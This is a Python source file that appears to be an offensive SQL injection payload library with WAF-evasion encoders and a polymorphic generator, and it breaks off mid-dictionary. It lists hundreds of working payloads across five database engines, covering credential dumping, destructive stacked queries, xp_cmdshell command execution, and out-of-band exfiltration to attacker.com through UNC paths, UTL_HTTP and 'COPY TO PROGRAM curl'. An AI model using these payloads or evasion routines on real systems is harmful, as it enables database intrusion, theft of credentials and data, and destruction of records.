"""
Advanced SQL Injection Payload Library - Phase 1 Enhancement

Ultra-comprehensive collection of 1000+ advanced, polymorphic SQL injection payloads including:
- UNION-based injection (all major DBMS)
- Boolean-based blind injection
- Time-based blind injection
- Out-of-band (OOB) injection
- Stacked queries
- Second-order injection
- WAF bypass techniques with adaptive encoding
- Error-based extraction
- Inference-based detection
- Modern bypass techniques

Features:
- Polymorphic payload generation
- Plugin-style encoding/obfuscation system
- Combinatorial payload generation
- Easy extension mechanism
- DBMS-specific optimizations
"""

from typing import Dict, List, Optional, Callable, Any, Tuple
import string
import random
import base64
import urllib.parse
import hashlib
import re


class PayloadEncoder:
    """
    Plugin-style encoding and obfuscation engine for payload transformation.
    
    Provides multiple encoding strategies that can be chained together
    for advanced WAF bypass capabilities.
    """
    
    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        """URL encode payload, optionally with double encoding."""
        encoded = urllib.parse.quote(payload)
        if double:
            encoded = urllib.parse.quote(encoded)
        return encoded
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Convert string to hex representation (0x...)."""
        hex_chars = ''.join([f'{ord(c):02x}' for c in payload])
        return f"0x{hex_chars}"
    
    @staticmethod
    def char_encode(payload: str, db_type: str = 'mysql') -> str:
        """Encode using CHAR() functions."""
        if db_type.lower() == 'mysql':
            char_codes = ','.join([str(ord(c)) for c in payload])
            return f"CHAR({char_codes})"
        elif db_type.lower() == 'mssql':
            char_codes = ','.join([str(ord(c)) for c in payload])
            return f"CHAR({char_codes})"
        elif db_type.lower() == 'oracle':
            chars = '||'.join([f"CHR({ord(c)})" for c in payload])
            return chars
        return payload
    
    @staticmethod
    def concat_obfuscate(payload: str, db_type: str = 'mysql') -> str:
        """Break payload into concatenated pieces."""
        if len(payload) < 2:
            return payload
        
        mid = len(payload) // 2
        part1, part2 = payload[:mid], payload[mid:]
        
        if db_type.lower() == 'mysql':
            return f"CONCAT('{part1}','{part2}')"
        elif db_type.lower() == 'mssql':
            return f"'{part1}'+'{part2}'"
        elif db_type.lower() == 'oracle':
            return f"'{part1}'||'{part2}'"
        elif db_type.lower() == 'postgresql':
            return f"'{part1}'||'{part2}'"
        return payload
    
    @staticmethod
    def comment_injection(payload: str) -> str:
        """Inject SQL comments to break up keywords."""
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR']
        result = payload
        for keyword in keywords:
            if keyword in result.upper():
                # Case-insensitive replacement with comment injection
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                result = pattern.sub(f"{keyword[:2]}/**/{ keyword[2:]}", result, count=1)
        return result
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """Randomly vary case of SQL keywords."""
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR', 'ORDER', 'BY', 'NULL']
        result = payload
        for keyword in keywords:
            if keyword in result.upper():
                # Random case variation
                variations = [keyword.lower(), keyword.upper(), keyword.capitalize(), 
                             keyword[:2].upper() + keyword[2:].lower()]
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                result = pattern.sub(random.choice(variations), result, count=1)
        return result
    
    @staticmethod
    def whitespace_variation(payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alternatives = ['\t', '\n', '\r', '/**/', '+', '%20', '%09', '%0a', '%0d']
        result = payload.replace(' ', random.choice(alternatives))
        return result
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Encode characters using Unicode escape sequences."""
        return ''.join([f'\\u{ord(c):04x}' for c in payload])
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode the payload."""
        return base64.b64encode(payload.encode()).decode()


class PolymorphicPayloadGenerator:
    """
    Generates polymorphic (mutating) payloads that adapt to bypass WAF/filters.
    
    Uses multiple transformation techniques to create variant payloads
    that maintain injection capability while evading detection.
    """
    
    def __init__(self, encoder: Optional[PayloadEncoder] = None):
        """
        Initialize polymorphic generator.
        
        Args:
            encoder: PayloadEncoder instance for transformations
        """
        self.encoder = encoder or PayloadEncoder()
        self.transformation_stack: List[Callable] = []
    
    def add_transformation(self, transform_func: Callable[[str], str]) -> 'PolymorphicPayloadGenerator':
        """
        Add a transformation function to the stack.
        
        Args:
            transform_func: Function that transforms a payload string
            
        Returns:
            Self for method chaining
        """
        self.transformation_stack.append(transform_func)
        return self
    
    def generate_variants(self, base_payload: str, count: int = 10) -> List[str]:
        """
        Generate multiple variants of a base payload.
        
        Args:
            base_payload: Original payload to mutate
            count: Number of variants to generate
            
        Returns:
            List of polymorphic payload variants
        """
        variants = [base_payload]
        
        # Generate variants using different transformation combinations
        transformations = [
            self.encoder.case_variation,
            self.encoder.comment_injection,
            self.encoder.whitespace_variation,
            lambda p: self.encoder.concat_obfuscate(p, 'mysql'),
            lambda p: self.encoder.url_encode(p, False),
        ]
        
        for i in range(min(count - 1, 20)):
            # Apply random combination of transformations
            variant = base_payload
            num_transforms = random.randint(1, min(3, len(transformations)))
            selected_transforms = random.sample(transformations, num_transforms)
            
            for transform in selected_transforms:
                try:
                    variant = transform(variant)
                except Exception:
                    continue
            
            if variant not in variants:
                variants.append(variant)
        
        return variants[:count]
    
    def generate_encoded_variants(self, base_payload: str, db_type: str = 'mysql') -> List[str]:
        """
        Generate encoded variants specific to database type.
        
        Args:
            base_payload: Original payload
            db_type: Target database type
            
        Returns:
            List of encoded payload variants
        """
        variants = []
        
        # URL encoding variants
        variants.append(self.encoder.url_encode(base_payload, False))
        variants.append(self.encoder.url_encode(base_payload, True))
        
        # Hex encoding
        if "'" in base_payload or '"' in base_payload:
            # Replace quoted strings with hex
            import re
            match = re.search(r"'([^']+)'", base_payload)
            if match:
                quoted_str = match.group(1)
                hex_version = self.encoder.hex_encode(quoted_str)
                variants.append(base_payload.replace(f"'{quoted_str}'", hex_version))
        
        # CHAR encoding
        variants.append(self.encoder.char_encode(base_payload, db_type))
        
        # Comment injection
        variants.append(self.encoder.comment_injection(base_payload))
        
        # Case variation
        variants.append(self.encoder.case_variation(base_payload))
        
        # Concatenation obfuscation
        variants.append(self.encoder.concat_obfuscate(base_payload, db_type))
        
        return variants


class AdvancedPayloadLibrary:
    """
    Ultra-comprehensive SQL injection payload library with 1000+ payloads.
    
    Provides categorized payloads for all major attack vectors and DBMS types,
    with built-in polymorphic generation and encoding capabilities.
    """
    
    # ===== ERROR-BASED PAYLOADS =====
    ERROR_BASED_PAYLOADS = [
        # Basic syntax errors
        "'", '"', "` ", "') ", '") ', "') OR ('", '") OR ("',
        "'; ", '"; ', "/*", "*/", "--", "#",
        
        # Quote variations
        "' --", "' #", "' /*", "' */",
        '" --', '" #', '" /*', '" */',
        "` --", "` #", "` /*", "` */",
        
        # Parenthesis variations
        "') --", '") --', "')) --", '")) --',
        "') #", '") #', "')) #", '")) #',
        
        # MySQL error-based
        "' AND extractvalue(1, concat(0x7e, version())) --",
        "' AND updatexml(1, concat(0x7e, version()), 1) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(0)))a) --",
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x) --",
        
        # PostgreSQL error-based
        "' AND CAST(version() AS int) --",
        "' AND CAST(current_database() AS int) --",
        "' AND 1=CAST(version() AS numeric) --",
        
        # MSSQL error-based
        "' AND 1=CONVERT(int, @@version) --",
        "' AND 1=CAST(@@version AS int) --",
        "' AND 1=db_name(0) --",
        
        # Oracle error-based
        "' AND 1=CAST(banner AS int) FROM v$version WHERE rownum=1 --",
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --",
        "' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))=1 --",
    ]
    
    # ===== UNION-BASED PAYLOADS (Expanded) =====
    UNION_BASED_PAYLOADS = {
        'mysql': [
            # NULL-based column enumeration (1-20 columns)
            *[f"' UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            *[f"' UNION ALL SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            *[f"') UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            *[f"') UNION ALL SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            
            # Numeric column enumeration
            *[f"' UNION SELECT {','.join([str(j) for j in range(1, i+1)])}--" for i in range(1, 11)],
            
            # Information extraction
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT NULL,database(),NULL--",
            "' UNION SELECT NULL,user(),NULL--",
            "' UNION SELECT NULL,@@datadir,NULL--",
            "' UNION SELECT NULL,@@hostname,NULL--",
            "' UNION SELECT NULL,@@version_compile_os,NULL--",
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT NULL,CONCAT(table_name,':',column_name),NULL FROM information_schema.columns--",
            "' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--",
            "' UNION SELECT NULL,CONCAT(email,':',password_hash),NULL FROM accounts--",
            
            # ORDER BY detection
            *[f"' ORDER BY {i}--" for i in range(1, 31)],
            
            # With hex encoding
            "' UNION SELECT 0x50524f4f46,user(),database()--",
            
            # With functions
            "' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--",
        ],
        'postgresql': [
            # NULL-based enumeration
            *[f"' UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            *[f"') UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            
            # Information extraction
            "' UNION SELECT NULL,version(),NULL--",
            "' UNION SELECT NULL,current_database(),NULL--",
            "' UNION SELECT NULL,current_user,NULL--",
            "' UNION SELECT NULL,current_schema(),NULL--",
            "' UNION SELECT NULL,inet_server_addr(),NULL--",
            "' UNION SELECT NULL,inet_server_port()::text,NULL--",
            "' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--",
            "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT NULL,usename,NULL FROM pg_user--",
            "' UNION SELECT NULL,passwd,NULL FROM pg_shadow--",
            
            # ORDER BY detection
            *[f"' ORDER BY {i}--" for i in range(1, 31)],
            
            # String aggregation
            "' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--",
        ],
        'mssql': [
            # NULL-based enumeration
            *[f"' UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            *[f"') UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            
            # Information extraction
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT NULL,DB_NAME(),NULL--",
            "' UNION SELECT NULL,SYSTEM_USER,NULL--",
            "' UNION SELECT NULL,SUSER_NAME(),NULL--",
            "' UNION SELECT NULL,@@SERVERNAME,NULL--",
            "' UNION SELECT NULL,HOST_NAME(),NULL--",
            "' UNION SELECT NULL,name,NULL FROM sysdatabases--",
            "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT NULL,name,NULL FROM syscolumns--",
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
            
            # ORDER BY detection
            *[f"' ORDER BY {i}--" for i in range(1, 31)],
            
            # XML PATH for string aggregation
            "' UNION SELECT NULL,(SELECT name+',' FROM sysobjects WHERE xtype='U' FOR XML PATH('')),NULL--",
        ],
        'oracle': [
            # NULL-based enumeration (Oracle requires FROM dual)
            *[f"' UNION SELECT {','.join(['NULL'] * i)} FROM dual--" for i in range(1, 21)],
            *[f"') UNION SELECT {','.join(['NULL'] * i)} FROM dual--" for i in range(1, 21)],
            
            # Information extraction
            "' UNION SELECT NULL,banner,NULL FROM v$version--",
            "' UNION SELECT NULL,user,NULL FROM dual--",
            "' UNION SELECT NULL,SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),NULL FROM dual--",
            "' UNION SELECT NULL,SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM dual--",
            "' UNION SELECT NULL,SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual--",
            "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
            "' UNION SELECT NULL,column_name,NULL FROM all_tab_columns--",
            "' UNION SELECT NULL,username,NULL FROM all_users--",
            
            # ORDER BY detection
            *[f"' ORDER BY {i}--" for i in range(1, 31)],
            
            # String concatenation
            "' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables WHERE rownum<=10--",
        ],
        'sqlite': [
            # NULL-based enumeration
            *[f"' UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            *[f"') UNION SELECT {','.join(['NULL'] * i)}--" for i in range(1, 21)],
            
            # Information extraction
            "' UNION SELECT NULL,sqlite_version(),NULL--",
            "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master WHERE type='table'--",
            
            # ORDER BY detection
            *[f"' ORDER BY {i}--" for i in range(1, 31)],
        ],
    }
    
    # ===== BOOLEAN-BASED BLIND PAYLOADS (Expanded) =====
    BOOLEAN_BASED_PAYLOADS = [
        # True conditions
        "' AND '1'='1", "' AND 1=1--", "' AND 'a'='a", "' AND TRUE--",
        "') AND ('1'='1", "') AND (1=1)--", "') AND TRUE--",
        "' AND 'abc'='abc", "' AND 'test'='test", "' AND 'x'='x' AND 'y'='y",
        
        # False conditions
        "' AND '1'='2", "' AND 1=2--", "' AND 'a'='b", "' AND FALSE--",
        "') AND ('1'='2", "') AND (1=2)--", "') AND FALSE--",
        "' AND 'abc'='xyz", "' AND 'test'='fail", "' AND 'x'='y' AND 'z'='w",
        
        # OR conditions (true)
        "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "' OR TRUE--",
        "') OR ('1'='1", "') OR (1=1)--", "') OR TRUE--",
        
        # OR conditions (false)
        "' OR '1'='2", "' OR 1=2--", "' OR 'a'='b", "' OR FALSE--",
        "') OR ('1'='2", "') OR (1=2)--", "') OR FALSE--",
        
        # Substring-based (MySQL/PostgreSQL)
        *[f"' AND SUBSTRING(database(),1,1)='{chr(i)}'--" for i in range(97, 123)],  # a-z
        *[f"' AND ASCII(SUBSTRING(database(),1,1))={i}--" for i in range(48, 123)],  # 0-z
        "' AND LENGTH(database())>0--",
        *[f"' AND LENGTH(database())={i}--" for i in range(1, 33)],
        "' AND LENGTH(user())>0--",
        *[f"' AND LENGTH(user())={i}--" for i in range(1, 33)],
        
        # Substring-based (MSSQL)
        *[f"' AND SUBSTRING(DB_NAME(),1,1)='{chr(i)}'--" for i in range(97, 123)],
        *[f"' AND ASCII(SUBSTRING(DB_NAME(),1,1))={i}--" for i in range(48, 123)],
        *[f"' AND LEN(DB_NAME())={i}--" for i in range(1, 33)],
        
        # Substring-based (Oracle)
        *[f"' AND SUBSTR(user,1,1)='{chr(i)}'--" for i in range(97, 123)],
        *[f"' AND ASCII(SUBSTR(user,1,1))={i}--" for i in range(48, 123)],
        *[f"' AND LENGTH(user)={i}--" for i in range(1, 33)],
        
        # EXISTS-based
        "' AND EXISTS(SELECT * FROM users)--",
        "' AND EXISTS(SELECT * FROM information_schema.tables)--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT 'a' FROM users LIMIT 1)='a'--",
        
        # Comparison-based
        "' AND 1<2--", "' AND 2>1--", "' AND 5>=5--", "' AND 5<=5--",
        "' AND 'a'<'b'--", "' AND 'z'>'a'--",
    ]
    
    # ===== TIME-BASED BLIND PAYLOADS (Expanded) =====
    TIME_BASED_PAYLOADS = {
        'mysql': [
            # SLEEP function
            *[f"' AND SLEEP({i})--" for i in range(1, 11)],
            *[f"') AND SLEEP({i})--" for i in range(1, 11)],
            *[f"' OR SLEEP({i})--" for i in range(1, 11)],
            *[f"'; SELECT SLEEP({i})--" for i in range(1, 11)],
            
            # Conditional SLEEP
            *[f"' AND IF(1=1,SLEEP({i}),0)--" for i in range(1, 11)],
            *[f"' AND IF(1=2,SLEEP({i}),0)--" for i in range(1, 11)],
            *[f"' AND IF(LENGTH(database())>0,SLEEP({i}),0)--" for i in range(1, 6)],
            *[f"' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP({i}),0)--" for i in range(1, 6)],
            
            # BENCHMARK function
            "' AND BENCHMARK(10000000,MD5('test'))--",
            "' AND BENCHMARK(50000000,SHA1('test'))--",
            
            # Subquery with SLEEP
            *[f"' AND (SELECT * FROM (SELECT(SLEEP({i})))x)--" for i in range(1, 11)],
        ],
        'postgresql': [
            # pg_sleep function
            *[f"' AND pg_sleep({i})--" for i in range(1, 11)],
            *[f"') AND pg_sleep({i})--" for i in range(1, 11)],
            *[f"' OR pg_sleep({i})--" for i in range(1, 11)],
            *[f"'; SELECT pg_sleep({i})--" for i in range(1, 11)],
            
            # Conditional pg_sleep
            *[f"' AND CASE WHEN (1=1) THEN pg_sleep({i}) ELSE pg_sleep(0) END--" for i in range(1, 11)],
            *[f"' AND CASE WHEN (1=2) THEN pg_sleep({i}) ELSE pg_sleep(0) END--" for i in range(1, 11)],
            *[f"' AND CASE WHEN (LENGTH(current_database())>0) THEN pg_sleep({i}) ELSE pg_sleep(0) END--" for i in range(1, 6)],
            
            # Generate_series for delay
            "' AND (SELECT COUNT(*) FROM generate_series(1,1000000))>0--",
            "' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",
        ],
        'mssql': [
            # WAITFOR DELAY
            *[f"'; WAITFOR DELAY '00:00:0{i}'--" for i in range(1, 10)],
            *[f"'; WAITFOR DELAY '00:00:{i:02d}'--" for i in range(10, 61, 5)],
            *[f"' WAITFOR DELAY '00:00:0{i}'--" for i in range(1, 10)],
            *[f"') WAITFOR DELAY '00:00:0{i}'--" for i in range(1, 10)],
            
            # Conditional WAITFOR
            "' IF (1=1) WAITFOR DELAY '00:00:05'--",
            "' IF (1=2) WAITFOR DELAY '00:00:05'--",
            "' IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '00:00:05'--",
            "' IF (LEN(DB_NAME())>0) WAITFOR DELAY '00:00:05'--",
            
            # Stacked WAITFOR
            *[f"'; IF (1=1) WAITFOR DELAY '00:00:0{i}'--" for i in range(1, 10)],
        ],
        'oracle': [
            # DBMS_LOCK.SLEEP
            *[f"' AND DBMS_LOCK.SLEEP({i})--" for i in range(1, 11)],
            *[f"') AND DBMS_LOCK.SLEEP({i})--" for i in range(1, 11)],
            
            # Conditional DBMS_LOCK.SLEEP
            *[f"' AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP({i}) ELSE 0 END IS NOT NULL--" for i in range(1, 11)],
            *[f"' AND CASE WHEN (1=2) THEN DBMS_LOCK.SLEEP({i}) ELSE 0 END IS NOT NULL--" for i in range(1, 11)],
            
            # Heavy query for delay
            "' AND (SELECT COUNT(*) FROM all_objects)>0--",
            "' AND (SELECT COUNT(*) FROM all_objects,all_objects)>0--",
        ],
        'sqlite': [
            # Heavy query (SQLite has no SLEEP)
            "' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)>0--",
            "' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%')>0--",
            *[f"' AND (SELECT COUNT(*) FROM (SELECT 1 {' UNION SELECT 1'*i}))>0--" for i in range(1, 11)],
        ],
    }
    
    # ===== STACKED QUERIES PAYLOADS (Expanded) =====
    STACKED_QUERIES_PAYLOADS = {
        'mysql': [
            "'; SELECT SLEEP(5)--",
            "'; DROP TABLE IF EXISTS test--",
            "'; CREATE TABLE test(id INT)--",
            "'; INSERT INTO test VALUES(1)--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
            "'; DELETE FROM test WHERE 1=1--",
            "'; SELECT * FROM users--",
            "'; SELECT @@version--",
            "'; SELECT database()--",
            "'; SELECT user()--",
            "'; SELECT table_name FROM information_schema.tables--",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--",
            "'; DROP TABLE IF EXISTS test--",
            "'; CREATE TABLE test(id INT)--",
            "'; INSERT INTO test VALUES(1)--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
            "'; DELETE FROM test WHERE true--",
            "'; SELECT version()--",
            "'; SELECT current_database()--",
            "'; SELECT current_user--",
            "'; SELECT tablename FROM pg_tables--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; DROP TABLE test--",
            "'; CREATE TABLE test(id INT)--",
            "'; INSERT INTO test VALUES(1)--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
            "'; DELETE FROM test WHERE 1=1--",
            "'; SELECT @@version--",
            "'; SELECT DB_NAME()--",
            "'; SELECT SYSTEM_USER--",
            "'; EXEC sp_configure 'show advanced options',1--",
            "'; EXEC sp_configure 'xp_cmdshell',1--",
            "'; EXEC xp_cmdshell 'whoami'--",
        ],
        'oracle': [
            "'; SELECT DBMS_LOCK.SLEEP(5) FROM dual--",
            "'; DROP TABLE test--",
            "'; CREATE TABLE test(id NUMBER)--",
            "'; INSERT INTO test VALUES(1)--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
            "'; DELETE FROM test WHERE 1=1--",
            "'; SELECT banner FROM v$version--",
            "'; SELECT user FROM dual--",
            "'; SELECT table_name FROM all_tables--",
        ],
    }
    
    # ===== OUT-OF-BAND (OOB) PAYLOADS (Expanded) =====
    OOB_PAYLOADS = {
        'mysql': [
            # LOAD_FILE with UNC path (Windows only)
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a')))--",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))--",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\a'))--",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',HEX(database()),'.attacker.com\\\\a'))--",
            
            # INTO OUTFILE (if writable directory known)
            "' UNION SELECT 'POC',@@version INTO OUTFILE '/tmp/sqli.txt'--",
        ],
        'mssql': [
            # xp_dirtree UNC path
            "'; EXEC master..xp_dirtree '\\\\\\\\'+@@version+'.attacker.com\\\\a'--",
            "'; DECLARE @q VARCHAR(1024);SET @q='\\\\\\\\'+CAST(@@version AS VARCHAR(1024))+'.attacker.com\\\\a'; EXEC master..xp_dirtree @q--",
            "'; EXEC master..xp_dirtree '\\\\\\\\'+DB_NAME()+'.attacker.com\\\\a'--",
            "'; EXEC master..xp_dirtree '\\\\\\\\'+SYSTEM_USER+'.attacker.com\\\\a'--",
            
            # xp_fileexist
            "'; EXEC master..xp_fileexist '\\\\\\\\'+@@version+'.attacker.com\\\\a'--",
            
            # xp_subdirs
            "'; EXEC master..xp_subdirs '\\\\\\\\'+@@version+'.attacker.com\\\\a'--",
        ],
        'oracle': [
            # UTL_HTTP
            "' || UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))--",
            "' || UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--",
            "' AND UTL_HTTP.REQUEST('http://attacker.com/'||database())=1--",
            
            # UTL_INADDR
            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual) IS NOT NULL--",
            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com') FROM dual) IS NOT NULL--",
            
            # DBMS_LDAP
            "' || DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80)--",
        ],
        'postgresql': [
            # COPY TO PROGRAM
            "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()--",
            "'; COPY (SELECT current_database()) TO PROGRAM 'curl http://attacker.com/?d='||current_database()--",
            "'; COPY (SELECT current_user) TO PROGRAM 'wget http://attacker.com/?d='||current_user--",
            
            # Large object functions (if enabled)
            "' AND (SELECT lo_import('\\\\\\\\attacker.com\\\\share\\\\file')) IS NOT NULL--",
        ],
    }
    
    # ===== WAF BYPASS PAYLOADS (Ultra-expanded) =====
    WAF_BYPASS_PAYLOADS = [
        # Case variation
        "' Or '1'='1", "' oR '1'='1", "' OR '1'='1", "' or '1'='1",
        "' UnIoN SeLeCt", "' uNiOn sElEcT", "' UNION select",
        
        # Comment-based obfuscation
        "' OR/**/'1'='1", "'/**/OR/**/1=1--", "' OR/*comment*/1=1--",
        "'/**/UNION/**/SELECT/**/NULL--", "' UN/**/ION SE/**/LECT NULL--",
        "' /*!50000OR*/ '1'='1", "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        
        # Multi-line comments
        "' OR/*\n*/1=1--", "' UNION/*\n*/SELECT/*\n*/NULL--",
        
        # Inline comments (MySQL-specific)
        "' OR /*!12345 1=1*/ --", "' /*!UNION*/ /*!SELECT*/ NULL--",
        
        # URL encoding (single)
        "%27%20OR%201=1--", "%27%20UnIoN%20SeLeCt%20NULL--",
        "%27%20AND%20%271%27%3D%271", "%27%20OR%20%27a%27%3D%27a",
        
        # Double URL encoding
        "%2527%2520OR%25201=1--", "%2527%2520UNION%2520SELECT%2520NULL--",
        
        # Unicode/UTF-8
        "' OR 1=1%23", "' OR 1=1%00", "' UNION SELECT%00NULL--",
        
        # Whitespace variations
        "'\tor\t'1'='1", "'\nor\n'1'='1", "' or\r\n'1'='1",
        "'\t\tOR\t\t'1'='1", "'\n\nUNION\n\nSELECT\n\nNULL--",
        
        # Tab/newline encoding
        "%09OR%091=1--", "%0aUNION%0aSELECT%0aNULL--", "%0dOR%0d1=1--",
        
        # Parentheses bypass
        "('or'('1')=('1')", "') or ('1')=('1", "('or'1='1')",
        "('union'('select'('null')))", "') union select (null)--",
        
        # String concatenation (MySQL)
        "' OR 'a'||'b'='ab", "' OR CONCAT('a','b')='ab",
        "' UNION SELECT CONCAT(0x61,0x62)--",
        
        # String concatenation (MSSQL)
        "' OR 'a'+'b'='ab", "' UNION SELECT 'a'+'b'--",
        
        # String concatenation (PostgreSQL)
        "' OR 'a'||'b'='ab", "' UNION SELECT 'a'||'b'--",
        
        # String concatenation (Oracle)
        "' OR 'a'||'b'='ab", "' UNION SELECT 'a'||'b' FROM dual--",
        
        # Scientific notation
        "' OR 1e0=1--", "' OR 2e0=2--", "' AND 1.0=1--",
        
        # Hex encoding
        "' OR 0x31=0x31--", "' OR 0x61646d696e='admin'--",
        "' UNION SELECT 0x50524f4f46--",  # PROOF
        
        # Alternative syntax
        "' OR 'a'LIKE'a", "' OR 'a'REGEXP'a", "' OR 'a'RLIKE'a",
        "' UNION SELECT NULL WHERE 1=1--", "' UNION DISTINCT SELECT NULL--",
        
        # Null byte injection
        "' OR '1'='1'%00", "' UNION SELECT NULL%00--",
        
        # Alternative quotes
        "` OR `1`=`1", "` UNION SELECT NULL--",
        
        # Mixed encoding
        "%27%20O%52%20%271%27%3D%271", "' %4F%52 '1'='1",
        
        # HTML encoding
        "' OR 1&#61;1--", "' UNION SELECT &#78;ULL--",
        
        # Buffer overflow attempts
        "' OR '1'='1" + "A"*1000 + "--",
        "' UNION SELECT NULL" + " "*1000 + "--",
        
        # Multiple encodings
        "%2527%2520%254F%2552%25201=1--",
        
        # Using different comment styles
        "' OR 1=1%23", "' OR 1=1-- -", "' OR 1=1;%00",
        
        # Version-specific comments (MySQL)
        "' /*!50000OR 1=1*/--", "' /*!12345UNION SELECT NULL*/--",
        
        # Arithmetic operations
        "' OR 1=1+0--", "' OR 2=1+1--", "' OR 3=2+1--",
        "' AND 5=2+3--", "' AND 10=5*2--", "' AND 1=2-1--",
        
        # Alternative operators
        "' || '1'='1", "' && '1'='1", "' | '1'='1", "' & '1'='1",
        
        # Bitwise operations
        "' OR 1|1=1--", "' OR 1&1=1--", "' OR 1^0=1--",
        
        # Character encoding (MySQL)
        "' OR CHAR(49)=CHAR(49)--", "' UNION SELECT CHAR(80,82,79,79,70)--",
        
        # Using functions to obfuscate
        "' OR ASCII('A')=65--", "' OR ORD('1')=49--",
        "' UNION SELECT CHAR(78)||CHAR(85)||CHAR(76)||CHAR(76)--",
    ]
    
    # ===== POLYGLOT PAYLOADS (Work across multiple contexts) =====
    POLYGLOT_PAYLOADS = [
        "' OR 1=1--", "\" OR 1=1--", "` OR 1=1--",
        "') OR ('1'='1", "\") OR (\"1\"=\"1", "`) OR (`1`=`1",
        "1' OR '1'='1", "1\" OR \"1\"=\"1", "1` OR `1`=`1",
        "admin' OR '1'='1'#", 'admin" OR "1"="1"#', "admin` OR `1`=`1`#",
        "' OR 'x'='x", "\" OR \"x\"=\"x", "` OR `x`=`x",
        "1' AND '1'='1' AND '1'='1", "1\" AND \"1\"=\"1\" AND \"1\"=\"1",
    ]
    
    # ===== SECOND-ORDER INJECTION PAYLOADS =====
    SECOND_ORDER_PAYLOADS = [
        "admin'--", "admin' OR '1'='1'--", "admin' OR 1=1#",
        "test'; DROP TABLE users--", "test' UNION SELECT NULL,NULL--",
        "' OR SLEEP(5)--", "admin' AND SLEEP(5)--",
        "<script>alert('XSS')</script>' OR '1'='1",  # Combined XSS+SQLi
        "'; EXEC xp_cmdshell('whoami')--",
        "admin'/**/OR/**/1=1--",
    ]
    
    # ===== ADVANCED DATABASE-SPECIFIC TECHNIQUES =====
    ADVANCED_TECHNIQUES = {
        'mysql': [
            # String operations
